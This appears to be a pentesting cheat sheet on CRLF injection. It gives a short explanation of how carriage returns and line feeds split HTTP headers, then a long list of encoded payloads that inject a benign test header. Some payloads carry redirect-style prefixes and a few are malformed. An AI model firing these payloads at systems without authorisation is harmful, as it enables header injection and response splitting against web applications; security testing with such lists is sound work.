# CRLF

A Carriage Return Line Feed (CRLF) Injection vulnerability occurs when an application does not sanitize user input correctly and allows for the insertion of carriage returns and line feeds, input which for many internet protocols, including HTML, denote line breaks and have special significance.  
For example, Parsing of HTTP message relies on CRLF characters (%0D%0A which decoded represent \r\n) to identify sections of HTTP messages, including headers.

Payloads for  **CRLF** 

%0AHeader-Test:TESTING
%0A%20Header-Test:TESTING
%20%0AHeader-Test:TESTING
%23%OAHeader-Test:TESTING
%E5%98%8A%E5%98%8DHeader-Test:TESTING
%E5%98%8A%E5%98%8D%0AHeader-Test:TESTING
%3F%0AHeader-Test:TESTING
crlf%0AHeader-Test:TESTING
crlf%0A%20Header-Test:TESTING
crlf%20%0AHeader-Test:TESTING
crlf%23%OAHeader-Test:TESTING
crlf%E5%98%8A%E5%98%8DHeader-Test:TESTING
crlf%E5%98%8A%E5%98%8D%0AHeader-Test:TESTING
crlf%3F%0AHeader-Test:TESTING
%0DHeader-Test:TESTING
%0D%20Header-Test:TESTING
%20%0DHeader-Test:TESTING
%23%0DHeader-Test:TESTING
%23%0AHeader-Test:TESTING
%E5%98%8A%E5%98%8DHeader-Test:TESTING
%E5%98%8A%E5%98%8D%0DHeader-Test:TESTING
%3F%0DHeader-Test:TESTING
crlf%0DHeader-Test:TESTING
crlf%0D%20Header-Test:TESTING
crlf%20%0DHeader-Test:TESTING
crlf%23%0DHeader-Test:TESTING
crlf%23%0AHeader-Test:TESTING
crlf%E5%98%8A%E5%98%8DHeader-Test:TESTING
crlf%E5%98%8A%E5%98%8D%0DHeader-Test:TESTING
crlf%3F%0DHeader-Test:TESTING
%0D%0AHeader-Test:TESTING
%0D%0A%20Header-Test:TESTING
%20%0D%0AHeader-Test:TESTING
%23%0D%0AHeader-Test:TESTING
\r\nHeader-Test:TESTING
 \r\n Header-Test:TESTING
\r\n Header-Test:TESTING
%5cr%5cnHeader-Test:TESTING
%E5%98%8A%E5%98%8DHeader-Test:TESTING
%E5%98%8A%E5%98%8D%0D%0AHeader-Test:TESTING
%3F%0D%0AHeader-Test:TESTING
crlf%0D%0AHeader-Test:TESTING
crlf%0D%0A%20Header-Test:TESTING
crlf%20%0D%0AHeader-Test:TESTING
crlf%23%0D%0AHeader-Test:TESTING
crlf\r\nHeader-Test:TESTING
crlf%5cr%5cnHeader-Test:TESTING
crlf%E5%98%8A%E5%98%8DHeader-Test:TESTING
crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:TESTING
crlf%3F%0D%0AHeader-Test:TESTING
%0D%0A%09Header-Test:TESTING
crlf%0D%0A%09Header-Test:TESTING
%250AHeader-Test:TESTING
%25250AHeader-Test:TESTING
%%0A0AHeader-Test:TESTING
%25%30AHeader-Test:TESTING
%25%30%61Header-Test:TESTING
%u000AHeader-Test:TESTING
//www.google.com/%2F%2E%2E%0D%0AHeader-Test:TESTING
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:TESTING
/google.com/%2F..%0D%0AHeader-Test:TESTING

